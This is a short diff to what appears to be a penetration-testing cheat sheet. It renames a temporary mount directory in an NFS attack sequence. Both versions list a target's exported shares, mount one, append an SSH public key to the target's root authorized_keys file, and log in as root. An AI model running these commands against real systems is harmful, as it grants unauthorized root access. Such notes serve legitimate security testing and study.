@@ -5,10 +5,10 @@ Unix
 
 showmount -e <target IP>
 
-mkdir /tmp/test
-mount -t nfs -o nolock <target IP>:/share /tmp/test/
-cat /root/.ssh/id_rsa.pub >> /tmp/test/root/.ssh/authorized_keys
-umount /tmp/test
+mkdir /tmp/mount
+mount -t nfs -o nolock <target IP>:/share /tmp/mount/
+cat /root/.ssh/id_rsa.pub >> /tmp/mount/root/.ssh/authorized_keys
+umount /tmp/mount
 ssh root@<target IP>
 ------------------------------------------------------------------------------------------------------
 
